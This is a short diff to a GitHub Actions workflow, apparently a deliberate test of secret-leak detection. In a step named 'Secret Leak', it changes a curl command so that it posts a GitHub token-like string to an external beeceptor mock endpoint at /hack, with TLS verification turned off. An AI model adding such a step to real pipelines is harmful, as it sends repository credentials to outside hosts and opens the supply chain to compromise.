@@ -31,11 +31,11 @@ jobs:
         
       - name: Secret Leak
         run: |
-          curl -X POST https://api.veribom.com/graphql \
+          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
             -H "Content-Type: application/json" \
             -d '{
-              "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
-            }'
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
         
       - name: Cleanup PSE
         if: always()
